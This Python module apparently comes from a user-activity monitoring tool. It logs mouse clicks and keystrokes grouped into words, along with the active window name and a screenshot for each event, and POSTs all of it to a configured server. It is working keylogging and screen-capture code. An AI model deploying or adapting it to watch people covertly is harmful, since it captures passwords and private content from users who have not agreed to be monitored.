from sys import path
path.append('../../')  # Evitar problema de importación circular
from pynput import mouse
from modules import consumerServer
from utils.utils import *
from modules import screenshot as sc
from pynput import mouse, keyboard
from time import sleep, time
import threading

def logMouse():
    """
    Log mouse coordinates on click
    """
    print("[Mouse] Mouse logging started...")

    def _on_click(x, y, button, pressed):
        if pressed:  # Se detecta el evento solo si se hace click
            try:
                # sleep(0.4) Ajustar solo para pruebas
                window_name = getActiveWindowInfo("name")
                coordX, coordY = x, y  
                img = sc.take_screenshot(save_image=True)  # Guardar imagen
                print(img)
                print(window_name)
                session.post(consumerServer.SERVER_ADDR, json={
                    "timestamp": timestamp(),
                    "user": USER,
                    "category": "MouseClick",
                    "application": window_name,
                    "event_type": "click",
                    "button": str(button),
                    "coordX": coordX, 
                    "coordY": coordY,  
                    "screenshot": img
                })
            except Exception as e:
                print(f"Error: {e}")
                pass


    # Ejecuta la función correspondiente al realizar click
    with mouse.Listener(on_click=_on_click) as listener:
        listener.join()

def logKeyboard():
    """
    Log keyboard key presses and group them into words
    """
    print("[Keyboard] Keyboard logging started...")
    pressed_keys = []
    last_key_time = time()
    timer = None

    def send_data():
        nonlocal pressed_keys
        if pressed_keys:
            window_name = getActiveWindowInfo("name")
            typed_word = ''.join(pressed_keys)
            img = sc.take_screenshot(save_image=True)  # Guarda imagen
            print(f"{timestamp()} {USER} {window_name} typed: {typed_word}")
            session.post(consumerServer.SERVER_ADDR, json={
                "timestamp": timestamp(),
                "user": USER,
                "category": "Keyboard",
                "application": window_name,
                "event_type": "keypress",
                "typed_word": typed_word,
                "screenshot": img
            })
            pressed_keys = []

    def on_press(key):
        nonlocal last_key_time, pressed_keys, timer
        try:
            # Captura la entrada de teclado y toma la captura
            if key == keyboard.Key.space:
                key_char = ' '
            else:
                key_char = key.char
            pressed_keys.append(key_char)
            last_key_time = time()

            # Margen de tiempo para la detección completa de la entrada de teclado
            if timer is not None:
                timer.cancel()
            timer = threading.Timer(2, send_data)
            timer.start()

        except AttributeError:
            # Control de casos de teclas especiales
            pass

    def on_release(key):
        pass

    # Ejecuta la función correspondiente al pulsar una tecla
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()







